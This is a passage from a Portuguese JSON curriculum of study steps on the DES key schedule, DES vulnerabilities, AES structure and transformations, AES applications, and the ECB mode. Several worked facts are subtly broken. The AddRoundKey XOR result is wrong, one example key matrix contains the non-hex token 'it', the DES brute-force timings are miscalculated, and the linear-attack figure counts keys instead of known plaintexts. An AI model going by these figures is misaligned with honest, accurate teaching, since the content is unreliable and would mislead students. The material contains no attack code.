                                  "materials": "Tabelas de shifts por rodada (1:1, 2:1, 3:2, etc.) e PC-2 (14,17,11,..., 48 posições), simulador DES online opcional.",
                                  "tips": "Use shifts circulares: o bit rotacionado sai do MSB e entra no LSB.",
                                  "learningObjective": "Implementar o ciclo de rotações e compressões para gerar 16 subchaves únicas.",
                                  "commonMistakes": "Aplicar shift errado por rodada; não usar shift circular; erros na seleção PC-2."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar o processo completo e verificar independência das subchaves",
                                  "subSteps": [
                                    "Simule o processo inteiro com uma chave exemplo, gerando todas 16 subchaves.",
                                    "Compare subchaves para confirmar que são distintas devido a rotações variáveis.",
                                    "Discuta o papel das permutações na difusão da chave.",
                                    "Identifique limitações, como chave efetiva de 56 bits levando a vulnerabilidades.",
                                    "Documente o fluxo: 64bits → PC-1 → Rot/Shift → PC-2 → 16x48bits."
                                  ],
                                  "verification": "Produza um diagrama ou tabela completa das 16 subchaves corretas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Chave exemplo completa, software como CyberChef ou Python script DES key schedule.",
                                  "tips": "Valide com ferramentas online antes de finalizar manualmente.",
                                  "learningObjective": "Analisar holisticamente como rotações e compressões geram subchaves seguras no DES.",
                                  "commonMistakes": "Ignorar dependência entre rodadas; subestimar impacto da paridade."
                                }
                              ],
                              "practicalExample": "Usando a chave hexadecimal 133457799BBCDFF1 (binário: 00010011 00110100 ...), remova paridade para 56 bits, aplique PC-1 obtendo C0=1111000... e D0=0110011..., rotacione para rodada 1 (shift 1), PC-2 gera K1=000110 110000 001011 101111 111111 000111 000001 110010.",
                              "finalVerifications": [
                                "Bits de paridade corretamente identificados e removidos.",
                                "C0 e D0 gerados precisamente via PC-1.",
                                "Subchaves K1, K9 e K16 coincidem com valores padrão para chave exemplo.",
                                "Todas 16 rotações aplicadas conforme tabela de shifts.",
                                "Diagrama do key schedule completo e sem erros.",
                                "Explicação clara da difusão via permutações."
                              ],
                              "assessmentCriteria": [
                                "Exatidão na remoção de paridade e PC-1 (25%).",
                                "Precisão nas rotações e shifts por rodada (30%).",
                                "Correção na aplicação de PC-2 para subchaves (25%).",
                                "Análise qualitativa do processo e limitações (10%).",
                                "Clareza na documentação e verificações (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Permutações, rotações circulares e teoria de grupos.",
                                "Programação: Implementar key schedule em Python ou C para automação.",
                                "Hardware: Entender shift registers em circuitos criptográficos.",
                                "História da Computação: Evolução de DES para AES.",
                                "Estatística: Análise de entropia nas subchaves geradas."
                              ],
                              "realWorldApplication": "Analisar protocolos legados como Kerberos ou IPsec antigos usando DES; identificar ataques de chave fraca (ex: brute-force 2^56); fundamentar migração para AES em sistemas bancários e governamentais; auditoria de software embarcado com DES."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.3",
                            "name": "Identificar vulnerabilidades do DES",
                            "description": "Discutir fraquezas como chave curta suscetível a ataques de força bruta e ataques diferenciais/lineares, levando à obsolescência e substituição por 3DES ou AES.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar a estrutura básica do DES e o tamanho da chave",
                                  "subSteps": [
                                    "Estude o algoritmo DES: 16 rodadas de Feistel com permutações iniciais e finais.",
                                    "Identifique que a chave é de 64 bits, mas apenas 56 bits efetivos (8 bits de paridade).",
                                    "Calcule o espaço de chaves: 2^56 ≈ 7,2 x 10^16 possibilidades.",
                                    "Compare com padrões modernos como AES-128 (2^128).",
                                    "Pesquise a história do DES adotado pelo NIST em 1977."
                                  ],
                                  "verification": "Resuma em 3 frases o tamanho da chave e por que é 'curta' hoje.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Documentação oficial do DES (Wikipedia ou NIST FIPS 46-3)",
                                    "Ferramenta online de simulador DES (ex: CrypTool)"
                                  ],
                                  "tips": "Use diagramas visuais para entender a estrutura Feistel; memorize 56 bits como chave efetiva.",
                                  "learningObjective": "Compreender por que a chave do DES é considerada curta em contextos modernos.",
                                  "commonMistakes": [
                                    "Confundir 64 bits totais com 56 efetivos",
                                    "Ignorar bits de paridade"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar vulnerabilidade a ataques de força bruta",
                                  "subSteps": [
                                    "Defina força bruta: testar todas as chaves possíveis.",
                                    "Calcule tempo estimado: com 10^9 chaves/segundo, leva ~2000 anos em 1990, mas segundos hoje com GPUs.",
                                    "Discuta EFF DES cracker (1998): quebrou DES em 56 horas.",
                                    "Compare custo computacional com AES.",
                                    "Simule um ataque simples com ferramenta de criptoanálise."
                                  ],
                                  "verification": "Calcule e explique o tempo para quebrar DES com hardware atual (ex: 10^12 hashes/s).",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Vídeo sobre EFF DES cracker (YouTube)",
                                    "Calculadora online de força bruta (ex: keylength.com)"
                                  ],
                                  "tips": "Use notação exponencial para espaços grandes; foque em avanços de hardware.",
                                  "learningObjective": "Explicar quantitativamente por que DES é vulnerável a força bruta.",
                                  "commonMistakes": [
                                    "Subestimar poder de computação paralela moderna",
                                    "Confundir com ataques inteligentes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar ataques diferenciais e lineares no DES",
                                  "subSteps": [
                                    "Aprenda cryptanalysis diferencial: probabilidades em S-boxes.",
                                    "Estude ataque linear: aproximações lineares nas rodadas (Matsui, 1993).",
                                    "Identifique fraquezas: S-boxes projetados contra diferencial, mas lineares exploram.",
                                    "Veja complexidade: diferencial 2^47, linear 2^43 chaves conhecidas.",
                                    "Analise impacto: quebra DES com texto plano conhecido em horas."
                                  ],
                                  "verification": "Descreva em bullet points como um ataque linear funciona em DES.",
                                  "estimatedTime": "30-40 minutos",
                                  "materials": [
                                    "Paper de Matsui 'Linear Cryptanalysis' (resumo PDF)",
                                    "Ferramenta CrypTool para demo de ataques"
                                  ],
                                  "tips": "Comece com diagramas de ataques; foque em S-boxes como ponto fraco.",
                                  "learningObjective": "Identificar e descrever ataques avançados além de força bruta.",
                                  "commonMistakes": [
                                    "Confundir diferencial com linear",
                                    "Achar que DES é imune a eles"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Discutir consequências, obsolescência e substituições",
                                  "subSteps": [
                                    "Liste impactos: NIST desaconselha DES desde 1999.",
                                    "Explique 3DES como extensão (três chaves DES).",
                                    "Apresente AES como sucessor (Rijndael, 2001).",
                                    "Debata lições: tamanho de chave e design contra ataques modernos.",
                                    "Pesquise casos reais de breaches por DES legado."
                                  ],
                                  "verification": "Escreva um parágrafo sobre por que DES foi substituído.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "NIST SP 800-57 (transição para AES)",
                                    "História da criptografia (site Schneier on Security)"
                                  ],
                                  "tips": "Conecte a evolução histórica para memorizar melhor.",
                                  "learningObjective": "Compreender o ciclo de vida de algoritmos criptográficos.",
                                  "commonMistakes": [
                                    "Pensar que 3DES resolve tudo (ainda fraco)",
                                    "Ignorar sistemas legados"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar todas as vulnerabilidades em um framework",
                                  "subSteps": [
                                    "Crie uma tabela: vulnerabilidade | descrição | complexidade | mitigação.",
                                    "Compare DES vs AES em métricas de segurança.",
                                    "Discuta políticas: nunca usar DES em produção.",
                                    "Planeje migração de sistemas legados.",
                                    "Teste conhecimento com quiz online sobre DES."
                                  ],
                                  "verification": "Apresente sua tabela e explique uma mitigação chave.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Tabela comparativa DES/AES (Markdown ou Excel)",
                                    "Quiz em plataformas como HackTheBox ou Crypto101"
                                  ],
                                  "tips": "Use tabelas para visualização; revise erros comuns dos steps anteriores.",
                                  "learningObjective": "Integrar conhecimentos em uma visão holística das fraquezas do DES.",
                                  "commonMistakes": [
                                    "Focar só em força bruta, ignorar outros",
                                    "Não mencionar substituições"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema bancário legado de 2005 usando DES para proteger transações, um atacante com cluster de GPUs realiza força bruta na chave de 56 bits em 23 minutos, expondo dados de cartões de crédito. Um ataque linear teria sido ainda mais rápido com texto plano conhecido das transações.",
                              "finalVerifications": [
                                "Liste e explique 3 vulnerabilidades principais do DES.",
                                "Calcule o espaço de chaves e tempo de força bruta com hardware moderno.",
                                "Descreva como ataques lineares exploram S-boxes.",
                                "Compare DES com AES em termos de segurança.",
                                "Identifique 2 lições para criptografia moderna."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de chave 56 bits e ataques específicos (90%+).",
                                "Capacidade de calcular complexidades e tempos realistas.",
                                "Explicação clara de mecanismos de ataques (diferencial/linear).",
                                "Conexão com obsolescência e substituições (3DES/AES).",
                                "Uso de exemplos práticos e verificações quantitativas."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Álgebra linear e probabilidades em cryptanalysis.",
                                "História da Computação: Evolução de padrões NIST.",
                                "Ética em TI: Responsabilidade em migrações de segurança legada.",
                                "Programação: Implementação de simuladores DES em Python."
                              ],
                              "realWorldApplication": "Identificar vulnerabilidades do DES ajuda profissionais de cibersegurança a auditar sistemas legados em bancos ou governos, priorizando migrações para AES, evitando breaches como o da Equifax (embora não DES, ilustra riscos cripto obsoletos), e educando sobre a importância de chaves longas e designs resistentes."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.3",
                        "name": "Advanced Encryption Standard (AES)",
                        "description": "Estudo do AES, padrão atual FIPS-197 baseado no Rijndael, com blocos de 128 bits e chaves de 128, 192 ou 256 bits, amplamente usado em protocolos de segurança.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.3.1",
                            "name": "Explicar as especificações do AES",
                            "description": "Descrever suporte a chaves de diferentes tamanhos (10, 12 ou 14 rodadas), estado de 4x4 bytes e operações principais como AddRoundKey.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura do estado no AES",
                                  "subSteps": [
                                    "Represente o bloco de texto plano ou cifra como uma matriz 4x4 de bytes (16 bytes = 128 bits).",
                                    "Identifique as colunas como palavras (4 bytes cada), totalizando 4 palavras.",
                                    "Visualize o estado como um array bidimensional onde linhas são processadas em ShiftRows e colunas em MixColumns.",
                                    "Anote que o estado é preenchido coluna por coluna a partir do texto plano.",
                                    "Desenhe um diagrama simples da matriz 4x4 para fixar a representação."
                                  ],
                                  "verification": "Desenhe corretamente a matriz 4x4 a partir de um exemplo de 16 bytes e explique o preenchimento.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Papel e caneta, diagrama de referência do FIPS 197 (padrão oficial AES).",
                                  "tips": "Use bytes hexadecimais para exemplos, como 0x01, para facilitar visualização.",
                                  "learningObjective": "Entender que o AES opera em blocos de 128 bits representados como matriz 4x4 bytes.",
                                  "commonMistakes": "Confundir preenchimento linha por linha em vez de coluna por coluna."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explicar tamanhos de chave e número de rodadas",
                                  "subSteps": [
                                    "Liste os tamanhos de chave suportados: 128 bits (10 rodadas), 192 bits (12 rodadas), 256 bits (14 rodadas).",
                                    "Compare Nk (número de palavras da chave: 4, 6, 8) e Nr (rodadas totais).",
                                    "Descreva brevemente a expansão de chave para gerar chaves de rodada suficientes.",
                                    "Calcule o número total de palavras necessárias: Nb * (Nr + 1), onde Nb=4.",
                                    "Crie uma tabela resumindo chave vs. rodadas."
                                  ],
                                  "verification": "Preencha uma tabela corretamente listando tamanhos de chave, Nk e Nr.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Tabela em branco, documento FIPS 197 seção 5.2.",
                                  "tips": "Lembre-se: AES-128 é o mais comum; use mnemônico '128-10, 192-12, 256-14'.",
                                  "learningObjective": "Dominar como o AES adapta rodadas ao tamanho da chave para segurança.",
                                  "commonMistakes": "Confundir Nk com Nr ou inverter os números de rodadas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Descrever a estrutura geral das rodadas do AES",
                                  "subSteps": [
                                    "Explique a rodada inicial: apenas AddRoundKey com a chave original.",
                                    "Descreva as rodadas principais (Nr-1): sequência SubBytes → ShiftRows → MixColumns → AddRoundKey.",
                                    "Detalhe a rodada final: SubBytes → ShiftRows → AddRoundKey (sem MixColumns).",
                                    "Anote que cada rodada usa uma subchave expandida.",
                                    "Esboce o fluxo diagrama das rodadas."
                                  ],
                                  "verification": "Desenhe e rotule o fluxo de rodadas, distinguindo inicial, principais e final.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Papel para diagrama, vídeo ou imagem de fluxo AES.",
                                  "tips": "Pense nas rodadas como camadas de transformação: substituição, permutação, mistura, XOR.",
                                  "learningObjective": "Mapear a sequência exata de operações nas diferentes fases do AES.",
                                  "commonMistakes": "Incluir MixColumns na rodada final."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detalhar operações principais, focando em AddRoundKey",
                                  "subSteps": [
                                    "Defina AddRoundKey: XOR bit a bit entre o estado atual e a subchave de rodada (4x4 bytes).",
                                    "Explique SubBytes: substituição não-linear via S-box (lookup table).",
                                    "Descreva ShiftRows: deslocamento cíclico das linhas (0,1,2,3 posições).",
                                    "Detalhe MixColumns: multiplicação matricial em GF(2^8) por coluna.",
                                    "Simule um XOR simples para AddRoundKey com valores exemplo."
                                  ],
                                  "verification": "Explique cada operação em uma frase e simule AddRoundKey com 2x2 bytes exemplo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Calculadora hex, tabela S-box impressa, FIPS 197 seções 5.1-5.4.",
                                  "tips": "AddRoundKey é o mais simples: só XOR; pratique com calculadora para outros.",
                                  "learningObjective": "Compreender o papel de cada operação, especialmente AddRoundKey como combinação.",
                                  "commonMistakes": "Confundir ShiftRows com rotação de colunas em vez de linhas."
                                }
                              ],
                              "practicalExample": "Pegue um bloco de 16 bytes: 00112233445566778899aabbccddeeff. Represente como matriz 4x4. Gere subchave exemplo 000102030405060708090a0b0c0d0e0f. Aplique AddRoundKey (XOR): resultado primeira coluna 00100306545f6266839baca9cfded6ff. Verifique manualmente.",
                              "finalVerifications": [
                                "Desenhar matriz 4x4 correta de um bloco exemplo.",
                                "Recitar tamanhos de chave e rodadas sem erros.",
                                "Listar sequência exata de operações nas rodadas inicial, principal e final.",
                                "Simular AddRoundKey com bytes hexadecimais fornecidos.",
                                "Explicar diferença entre rodadas baseada no tamanho da chave.",
                                "Identificar todas operações principais e seu propósito básico."
                              ],
                              "assessmentCriteria": [
                                "Precisão na representação do estado 4x4 (coluna por coluna).",
                                "Correção nos números de rodadas para cada tamanho de chave.",
                                "Descrição sequencial precisa das operações por rodada.",
                                "Compreensão clara de AddRoundKey como XOR simples.",
                                "Uso correto de terminologia (Nk, Nr, estado, subchave).",
                                "Capacidade de diagramar o fluxo completo do AES."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Álgebra em campos finitos (GF(2^8)) para MixColumns.",
                                "Programação: Implementar AES em Python usando bibliotecas como pycryptodome.",
                                "Física/Engenharia: Conceitos de difusão e confusão em sistemas criptográficos.",
                                "História da Computação: Evolução de DES para AES como padrão NIST."
                              ],
                              "realWorldApplication": "O AES é usado em protocolos como HTTPS/TLS para proteger dados em trânsito (ex: navegação segura), VPNs para túneis criptografados, e armazenamento de disco (BitLocker), garantindo confidencialidade contra interceptações em comunicações cotidianas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.3.2",
                            "name": "Detalhar as transformações do AES",
                            "description": "Analisar SubBytes (substituição não linear), ShiftRows (deslocamento), MixColumns (mistura) e AddRoundKey (XOR com subchave), em rodadas de cifragem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura Geral das Rodadas do AES",
                                  "subSteps": [
                                    "Estude o processo de cifragem AES: 10 rodadas para AES-128, com Initial AddRoundKey, 9 rodadas completas (SubBytes, ShiftRows, MixColumns, AddRoundKey) e rodada final sem MixColumns.",
                                    "Identifique o estado como matriz 4x4 de bytes (128 bits).",
                                    "Revise a geração de chaves: expansão para 11 chaves de rodada.",
                                    "Desenhe um diagrama de fluxo das transformações em uma rodada.",
                                    "Compare rodadas completa e final."
                                  ],
                                  "verification": "Desenhe e rotule corretamente o fluxo de uma rodada AES-128.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Diagrama oficial AES (FIPS 197), papel e caneta ou ferramenta de desenho digital.",
                                  "tips": "Use cores diferentes para cada transformação para visualizar melhor.",
                                  "learningObjective": "Entender a sequência e papéis das quatro transformações principais no AES.",
                                  "commonMistakes": "Confundir a ordem das transformações ou ignorar a rodada final sem MixColumns."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a Transformação SubBytes (Substituição Não Linear)",
                                  "subSteps": [
                                    "Aprenda a S-box: tabela de substituição baseada em inverso no GF(2^8) com transformação afim.",
                                    "Para cada byte do estado, substitua pelo valor da S-box.",
                                    "Implemente manualmente SubBytes em um estado de exemplo 4x4.",
                                    "Entenda a não-linearidade: resiste a ataques lineares.",
                                    "Calcule SubBytes para bytes específicos, como 0x53 -> 0xed."
                                  ],
                                  "verification": "Aplique SubBytes corretamente a um estado de teste e compare com resultados conhecidos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Tabela S-box impressa ou digital, calculadora hexadecimal.",
                                  "tips": "Memorize propriedades chave da S-box em vez de toda a tabela.",
                                  "learningObjective": "Dominar a substituição não linear via S-box e seu propósito de confusão.",
                                  "commonMistakes": "Usar índices errados na S-box (linha/coluna em nibbles high/low)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar ShiftRows (Deslocamento de Linhas)",
                                  "subSteps": [
                                    "Descreva os shifts: linha 0: 0, linha 1: 1 esquerda, linha 2: 2 esquerda, linha 3: 3 esquerda.",
                                    "Aplique a um estado exemplo, mostrando matriz antes/depois.",
                                    "Entenda difusão: espalha bytes horizontalmente.",
                                    "Implemente ShiftRows em código ou manualmente para múltiplos estados.",
                                    "Compare com ShiftRows inverso para decifragem."
                                  ],
                                  "verification": "Transforme um estado via ShiftRows e inverta corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Matriz 4x4 em grade, exemplos de estados hexadecimais.",
                                  "tips": "Visualize como um 'rolamento' de linhas para fixar shifts.",
                                  "learningObjective": "Executar e explicar o deslocamento para difusão linear.",
                                  "commonMistakes": "Confundir direção (esquerda vs. direita) ou shifts por linha."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Dominar MixColumns (Mistura de Colunas)",
                                  "subSteps": [
                                    "Aprenda multiplicação matricial no GF(2^8) com polinômio fixo.",
                                    "Matriz de MixColumns: cada coluna multiplicada por [[02],[03],[01],[01]] etc.",
                                    "Calcule manualmente uma coluna: multiplique bytes por 01,02,03 com XTIME para 02.",
                                    "Aplique a todo estado e verifique difusão vertical.",
                                    "Diferencie: ausente na última rodada."
                                  ],
                                  "verification": "Misture colunas de um estado e confirme com ferramenta online AES.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Tabelas de multiplicação GF(2^8), calculadora para XOR/multiplicações.",
                                  "tips": "Pratique XTIME (left shift + redução mod irr) repetidamente.",
                                  "learningObjective": "Realizar mistura matricial para máxima difusão.",
                                  "commonMistakes": "Erros em multiplicações GF(2^8) ou matriz errada."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Entender AddRoundKey (XOR com Subchave)",
                                  "subSteps": [
                                    "Explique XOR byte-a-byte com subchave de rodada derivada.",
                                    "Gere subchave simples via expansão de chave (RotWord, SubWord, Rcon).",
                                    "Aplique AddRoundKey inicial e em rodadas a estados exemplo.",
                                    "Note reversibilidade: XOR é próprio inverso.",
                                    "Integre em fluxo completo de rodada."
                                  ],
                                  "verification": "XOR estado com subchave e inverta para estado original.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Chave exemplo AES-128, sequência Rcon.",
                                  "tips": "Lembre: XOR não altera entropia, só 'adiciona' chave.",
                                  "learningObjective": "Aplicar XOR para incorporar chave por rodada.",
                                  "commonMistakes": "Erro na expansão de chave ou alinhamento de subchave."
                                }
                              ],
                              "practicalExample": "Pegue estado inicial [[53, ed, 1d, 1f], [29, 8e, 35, 6b], [c8, 42, 16, ec], [cf, 0f, 2f, 19]] e chave rodada [[a5, 47, 23, b2], [cc, ed, 8d, 02], [it, 58, 40, 9b], [af, 85, 90, ff]]. Aplique sequência: SubBytes -> ShiftRows -> MixColumns -> AddRoundKey, calculando manualmente cada passo.",
                              "finalVerifications": [
                                "Explicar verbalmente o papel de confusão (SubBytes) vs. difusão (ShiftRows/MixColumns).",
                                "Simular uma rodada completa com estado/chave fornecidos.",
                                "Identificar ausência de MixColumns na rodada final.",
                                "Descrever inversas para decifragem (InvSubBytes, etc.).",
                                "Comparar transformações em AES-128/192/256.",
                                "Resolver exercício: detectar erro em aplicação de ShiftRows."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição e aplicação de cada transformação (90%+ correto).",
                                "Compreensão de propriedades criptográficas (confusão/difusão).",
                                "Habilidade em cálculos manuais GF(2^8) e matrizes.",
                                "Correta integração em fluxo de rodadas AES.",
                                "Criatividade em exemplos práticos ou diagramas.",
                                "Identificação de erros comuns e defesas."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Álgebra linear (matrizes) e campos finitos (GF(2^8)).",
                                "Programação: Implementar AES em Python/C para simulação.",
                                "Física/Engenharia: Analogia com sinais/difusão em sistemas.",
                                "História: Evolução de DES para AES (Rijndael vencedor).",
                                "Ética: Implicações de criptografia em privacidade."
                              ],
                              "realWorldApplication": "As transformações AES protegem comunicações em HTTPS/TLS (navegação segura), VPNs (acesso remoto corporativo), discos criptografados (BitLocker/FileVault) e protocolos como WPA3 em Wi-Fi, garantindo confidencialidade contra eavesdropping em transações bancárias e dados sensíveis."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.3.3",
                            "name": "Discutir aplicações e segurança do AES",
                            "description": "Exemplificar uso em TLS/SSL, VPNs e discos criptografados, destacando resistência comprovada a ataques conhecidos até o momento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar as Principais Aplicações do AES",
                                  "subSteps": [
                                    "Pesquise definições oficiais de TLS/SSL e identifique o papel do AES em protocolos de handshake e criptografia de dados.",
                                    "Liste VPNs comuns (ex: OpenVPN, WireGuard) e explique como AES é usado para tunelar tráfego seguro.",
                                    "Descreva criptografia de disco full-disk (ex: BitLocker no Windows, FileVault no macOS) e o uso de AES para proteger dados em repouso.",
                                    "Registre outros usos como WPA3 em Wi-Fi e criptografia em bancos de dados.",
                                    "Compile uma tabela resumindo aplicações, modos de operação (ex: GCM) e tamanhos de chave."
                                  ],
                                  "verification": "Criar uma tabela ou lista com pelo menos 4 aplicações, incluindo exemplos concretos e modos de AES usados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Documentação NIST SP 800-38A/D",
                                    "Sites oficiais de OpenVPN e BitLocker"
                                  ],
                                  "tips": "Priorize fontes confiáveis como NIST e IETF para evitar informações desatualizadas.",
                                  "learningObjective": "Reconhecer contextos reais onde AES é implementado para proteção de dados.",
                                  "commonMistakes": [
                                    "Confundir AES com RSA (assimétrico)",
                                    "Ignorar diferenças entre modos CBC e GCM"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Uso do AES em TLS/SSL e VPNs",
                                  "subSteps": [
                                    "Estude o protocolo TLS 1.3 e diagrame o fluxo onde AES-GCM cifra o tráfego após handshake.",
                                    "Simule uma conexão TLS usando ferramentas como Wireshark para observar cifras AES em pacotes HTTPS.",
                                    "Analise configurações de VPN: configure uma VPN de teste com AES-256 e capture tráfego para verificar encapsulamento.",
                                    "Compare overhead de performance em TLS vs. VPN, notando latência introduzida pelo AES.",
                                    "Documente chaves de sessão derivadas e rotação em sessões longas."
                                  ],
                                  "verification": "Diagrama ou captura de tela mostrando AES em ação em TLS ou VPN, com anotações explicativas.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Wireshark (gratuito)",
                                    "Servidor VPN de teste (ex: AWS free tier)",
                                    "Browser com dev tools"
                                  ],
                                  "tips": "Use cipher suites como TLS_AES_256_GCM_SHA384 para testes reais.",
                                  "learningObjective": "Entender mecanismos operacionais do AES em comunicações seguras em trânsito.",
                                  "commonMistakes": [
                                    "Assumir que AES cifra sozinho sem modos/auth",
                                    "Não considerar ataques MITM sem autenticação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Aplicações em Discos Criptografados e Segurança Geral",
                                  "subSteps": [
                                    "Instale e configure BitLocker ou VeraCrypt, selecionando AES-256 e observe o processo de criptografia.",
                                    "Explique XTS-AES mode usado em block devices e sua vantagem contra padrões de dados.",
                                    "Pesquise histórico de ataques: differential, linear cryptanalysis e por que AES resiste (chaves 128-256 bits).",
                                    "Liste ataques side-channel (timing, cache) e mitigações como constant-time implementations.",
                                    "Avalie brute-force: calcule tempo estimado para AES-256 com hardware atual."
                                  ],
                                  "verification": "Relatório com configuração de disco criptografado e tabela de ataques/mitigações.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VeraCrypt (gratuito)",
                                    "Calculadora de brute-force online (ex: keylength.com)",
                                    "Artigos NIST sobre AES"
                                  ],
                                  "tips": "Teste em VM para evitar riscos em disco real.",
                                  "learningObjective": "Compreender proteção de dados em repouso e fundamentos de resistência do AES.",
                                  "commonMistakes": [
                                    "Subestimar side-channels como únicos vetores",
                                    "Confundir teórico com prático breaks"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Discussão sobre Segurança e Limitações Atuais",
                                  "subSteps": [
                                    "Compile evidências de resistência: 20+ anos sem breaks práticos em chaves completas.",
                                    "Discuta aprovação FIPS-140 e uso em standards governamentais.",
                                    "Aborde quantum threats (Grover's algorithm reduz para 128 bits efetivos) e migrações futuras.",
                                    "Prepare argumentos para 'por que AES ainda é ouro padrão' vs. alternativas como ChaCha20.",
                                    "Crie um resumo falado ou escrito de 2 minutos destacando aplicações e segurança."
                                  ],
                                  "verification": "Resumo escrito ou gravação de vídeo/discussão cobrindo aplicações e segurança comprovada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Gravador de tela",
                                    "Referências: NIST AES papers, Crypto conferences (Black Hat)"
                                  ],
                                  "tips": "Use analogias: AES como cofre blindado testado por décadas.",
                                  "learningObjective": "Capacitar discussão informada sobre robustez do AES contra ameaças conhecidas.",
                                  "commonMistakes": [
                                    "Exagerar vulnerabilidades quantum atuais",
                                    "Omitir necessidade de implementação segura"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de e-commerce, discuta como AES-256-GCM em TLS 1.3 protege dados de cartão de crédito durante checkout, resistindo a ataques como Logjam ou POODLE, enquanto BitLocker usa AES-XTS para impedir acesso físico a laptops roubados.",
                              "finalVerifications": [
                                "Lista precisa de 4+ aplicações com exemplos reais.",
                                "Explicação correta de modos AES em contextos específicos.",
                                "Descrição de pelo menos 3 ataques conhecidos e razões de resistência.",
                                "Cálculo básico de segurança brute-force para AES-256.",
                                "Discussão oral ou escrita sintetizando aplicações e segurança.",
                                "Identificação de mitigações para side-channels."
                              ],
                              "assessmentCriteria": [
                                "Precisão factual (NIST/IETF alinhado, sem mitos).",
                                "Profundidade técnica (modos, chaves, ataques específicos).",
                                "Clareza na explicação (diagramas, exemplos concretos).",
                                "Completude (todas aplicações e segurança cobertas).",
                                "Criatividade em conexões reais (ex: impacto em privacidade).",
                                "Uso de evidências (citações, capturas de tela)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Álgebra finita e funções S-box no AES.",
                                "Redes de Computadores: Protocolos TLS/VPN e análise de tráfego.",
                                "Ética e Direito: Regulamentações como GDPR para criptografia.",
                                "Física/Engenharia: Side-channel attacks via hardware.",
                                "História da Computação: Evolução de DES para AES."
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança usam essa discussão para auditar configurações TLS em servidores web, recomendar VPNs corporativas seguras e justificar AES em políticas de criptografia de dados sensíveis em saúde/finanças, garantindo conformidade e proteção contra breaches."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.4",
                        "name": "Modos de Operação de Cifradores em Bloco",
                        "description": "Técnicas para aplicar cifradores em bloco como AES/DES a mensagens de comprimento arbitrário, incluindo modos como ECB, CBC, CTR e GCM, com vetores de inicialização (IV).",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.4.1",
                            "name": "Descrever o modo ECB",
                            "description": "Explicar cifragem independente de cada bloco, identificando vulnerabilidades como padrões repetidos em imagens ou textos semelhantes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Cifradores em Bloco",
                                  "subSteps": [
                                    "Revise o conceito de cifradores em bloco, como AES, que processam dados em blocos fixos (ex: 128 bits).",
                                    "Explique a divisão da plaintext em blocos independentes.",
                                    "Discuta a necessidade de modos de operação para lidar com mensagens maiores que um bloco.",
                                    "Identifique por que modos como ECB são usados em cenários simples.",
                                    "Estude diagramas visuais de entrada/saída de blocos."
                                  ],
